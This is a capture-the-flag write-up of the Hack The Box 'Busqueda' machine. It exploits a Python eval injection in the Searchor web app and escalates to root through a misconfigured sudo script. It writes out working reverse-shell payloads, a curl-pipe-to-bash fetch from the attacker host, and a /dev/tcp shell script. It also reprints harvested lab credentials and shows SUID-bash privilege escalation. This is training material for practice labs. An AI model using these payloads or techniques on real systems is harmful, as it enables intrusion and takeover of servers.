---
title: Hack The Box - Busqueda
date: 2023-07-05 13:33:37 +0200
categories:
  - HackTheBox
tags:
  - HTB
comments: true
---

HTB Busqueda Machine - https://www.hackthebox.com/machines/busqueda

### Scanning & Enumeration
Scan the `Busqueda` machine
```
nmap -A -p- -Pn 10.10.11.208
```

Output:
	22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	80/tcp open http Apache httpd 2.4.52

Lets navigate to the host `searcher.htb` via any browser, and it redirect to `searcher.htb`, and it revealed a web application named: `Searcher (version 2.4.0)`, and it a python language

So add it to the hosts file: `/etc/hosts`
	`10.10.11.208     searcher.htb`

### Exploitation & Gaining Access
We will search in google for: `Searcher (version 2.4.0)` vulnerabilities , and it is vulnerable to a remote code injection:
	https://security.snyk.io/package/pip/searchor

So lets search in google for: `eval python injection` , we will found:
	https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html

#### Getting a Shell with Python
1st way get a shell, by inserting a crafted Python payload into the query field, I was able to achieve a reverse shell.

First, make our listener, to receive the shell through it
```
nc -nvlp 1234
```

Second, intercept the search query in the `searcher.htb` website, with burp suite tool, and replace the query value with this reverse shell,  with the shell upgrade, and modify our internal IP
```
engine=Amazon&query=',exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.19",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'))#
```

#### Getting a Shell to Bash
2st way to get a shell, directly Make a python reverse shell from this site: https://www.revshells.com/

First, mouepad.sh shell.sh make a reverse shell file with our internal IP:
```
#!/bin/bash
bash -i \>& /dev/tcp/10.10.16.13/1234 0\>&1
```

Then, make it executable
```
chmod +x shell.sh
```

Second, make a python server in the same directory of our `shell.sh `file, to download it on the victim sever
```
python3 -m http.server 80
```

Third, make our listener, to receive the shell through it
```
nc -nvlp 1234`
```

Fourth, intercept the search query in the `searcher.htb` website, with burp suite tool, and replace the query value with this python eval reverse shell, and modify our internal IP
```
engine=Amazon&query=http%3a//127.0.0.1/debug'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.16.13/shell.sh|bash")','a','single'))%2b'&auto_redirect=
```
 
We will got a shell on our listener
```
whoami            // svc
cd /home/svc
cat user.txt
```

### Privilege Escalation
#### Using Misconfiguration
After gaining access, I began searching for sensitive files and writable locations. Exploring files and directories
```
ls -lah
cd .git
cat config
```

![](/assets/img/posts/Pasted image 20260811182844.png)

We will find a username, and a passwords, and a subdomain in a hidden .git directory in the current working directory: `http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site`

So add the subdomain to: `/etc/hosts`, to open it
	`10.10.11.208     gitea.searcher.htb`

And we can login to the site: `gitea.searcher.htb` , with the user and credentials we found:
- Username: cody
- Password: jh1usoih2bkjaspwe92

![700](pastedimage 2)

Exploring the interface hinted at possible privilege escalation paths, but nothing immediately exploitable.

Now we can now login with SSH with the username and password we found:
```
ssh svc@searcher.htb
Password: jh1usoih2bkjaspwe92
```

Do some enumeration to find something interesting
```
svc@busqueda:~$ cd /
svc@busqueda:~$ etc
svc@busqueda:~$ cd apache2
svc@busqueda:~$ cd sites-available
svc@busqueda:~$ cat 000-defalt.config
svc@busqueda:~$ cd /tmp
svc@busqueda:~$ ls
```

To know what a user can run as a sudo without a password
```
svc@busqueda:~$ sudo -l
enter the password: jh1usoih2bkjaspwe92
```

It will revealed the following::
	`(root) /usr/bin/python3 /opt/scripts/system-checkup.py`

Now system checkup doesn’t quite work. But looking in our scripts as admin we can see this:

![385](https://miro.medium.com/v2/resize:fit:350/0*5Y2oD4cfkmAYSN70.png)

By leveraging this, I prepared a Python-based reverse shell script

Make `full-checkup.sh` script to creates a Bash script that, when executed with sufficient privileges, sets the SUID bit on `/bin/bash`
```
svc@busqueda:~$ echo "#!/bin/bash" > full-checkup.sh
svc@busqueda:~$ echo "chmod +s /bin/bash" >> full-checkup.sh
```

Then run it like that
```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup.sh
```

Starts Bash while preserving the process's effective privileges instead of Bash dropping them.
```
svc@busqueda:~$ ls -la /bin/bash
svc@busqueda:~$ /bin/bash -p
whoami               // root
cd /root
cd root.txt
```

#### Using Docker
And when tried the script before, Run the Python script `/opt/scripts/system-checkup.py` with root privileges, passing `test` as its command-line argument
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
```
 It shows that is a docker is running
 
So we will retrieve information about the currently running containers
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```
There is `gitea` running on one docker, and a MySQL database on the other docker

After searching, found this:
	https://docs.docker.com/engine/reference/commandline/inspect/

We can use docker-inspect to fetch more details, so let's see if we can get the administrator password from MySQL

But first we need MySQL password and user for login, so let's try looking into the config files of `gitea` docker
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
```

We will find:
	`GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh`

So now we have user and credentials:
- Username: gitea
- Password: yuiu1hoiu4i5ho1uh

Lists all the listening TCP sockets on a Linux-based system for looking to find if there is any way I can abuse any of them
```
ss -tl
```

Get administrator password from MySQL
```
mysql -h 127.0.0.1 -u gitea -p yuiu1hoiu4i5ho1uh gitea           // this worked with me
```

After entering MYSQL DB, there is table that contains the access permission setting of repositories that are hosted on `gitea` and luckily I found a repository table containing a column called: `is_private, so i just changed it to "0":`
`update repository set is_private = 0;`

Now go back to `gitea` , we will see the administrator repository in there, because it's not private anymore
Now we finally can look at source code and see if there is anything we can take advantage of
After reading code , we found something very interesting on line 47 which means that It will look for the file in the current working: `arg_list = \[\'./full-checkup.sh\'\]`
We can change the directory and make our own file to escalate privileges but the file name should be the same

Make our own file to escalate privileges, nano `full-checkup.sh`
```
#!/bin/bash
chmod +s /bin/bash
chmod +x full-checkup.sh
```

Gives everyone full permissions on `full-checkup.sh` read, write, and execute
```
chmod 777 full-checkup.sh
```

Then run it like that
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup.sh
```

Starts Bash while preserving the process's effective privileges instead of Bash dropping them.
```
ls -la /bin/bash
/bin/bash -p
whoami                   // root
cd /root
cd root.txt
```
